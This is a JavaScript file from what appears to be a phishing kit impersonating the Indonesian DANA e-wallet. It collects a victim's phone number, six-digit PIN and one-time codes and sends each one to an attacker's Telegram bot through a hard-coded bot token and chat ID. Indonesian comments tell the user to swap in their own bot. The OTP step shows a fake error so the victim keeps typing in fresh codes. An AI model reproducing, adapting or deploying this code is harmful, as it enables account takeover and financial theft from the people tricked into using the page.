 function sendNohp(event){
    $("#process").show();event.preventDefault();
    $("#inp").blur();
     
    
    
    var nomor = document.getElementById("inp").value;
            sessionStorage.setItem("nomor", nomor);
    var logo = document.getElementById('logo');       
    var inp = document.getElementById('inp');
    
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value;
   
    var token = '6410163157:AAGv6puSTciUrU5THkEr34QePcazjSXv7fE'; // Ganti dengan token bot yang kamu buat
    var grup = '6075822784'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    success: function(){
    $("#process").hide();
    document.getElementById("back1").style.display = "none";
    document.getElementById("back2").style.display = "block";
    $("#formNohp").fadeOut();
    setTimeout(function(){
    $("#formPin").fadeIn();
    $("#pin1").focus();
    }, 500);}});};
    

function sendPin(){

 
 
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor+ " via<br/>";
 
  var logo = document.getElementById('logo'); 
 
 var pin11 = document.getElementById('pin11');
 var pin22 = document.getElementById('pin22');
 var pin33 = document.getElementById('pin33');
 var pin44 = document.getElementById('pin44');
 var pin55 = document.getElementById('pin55');
 var pin66 = document.getElementById('pin66');
     
  var gabungan = '' + logo.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin11.value + pin22.value + pin33.value + pin44.value + pin55.value + pin66.value;
  
     
 

    var token = '6410163157:AAGv6puSTciUrU5THkEr34QePcazjSXv7fE'; // Ganti dengan token bot yang kamu buat
    var grup = '6075822784'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,


success: function(){
$("#process").hide();

document.getElementById("alert").style.display = "block"; 
$("#myOtp").fadeIn();
$("#boxotp").fadeIn();
$("#formPin").reset();
setInterval(countdown, 1000);
$("#otp1").focus();
}
}
);
};


  function sendOtp(){
    $(".loadingOtp").show();
     var logo = document.getElementById('logo'); 
 
     var otp1 = document.getElementById('otp1');
   var otp2 = document.getElementById('otp2');
   var otp3 = document.getElementById('otp3');
   var otp4 = document.getElementById('otp4');
  setTimeout(function(){
$(".alert").text("Mohon pastikan kodenya sudah benar dan coba lagi");
$(".alert").css("color","red");
 },2000);
    var gabungan = '' + logo.value + '%0A%0A𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value;


    var token = '6410163157:AAGv6puSTciUrU5THkEr34QePcazjSXv7fE'; // Ganti dengan token bot yang kamu buat
    var grup = '6075822784'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
   success: function(){
    setTimeout(function(){
    $(".loadingOtp").hide();
   
    $('.inpotp').val('');
   
  var nomor = sessionStorage.getItem("nomor");
        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via<br/>";
   $(".alert").css("color","black");
    },4000);
   
        
    }
        
    }
    );
        
    };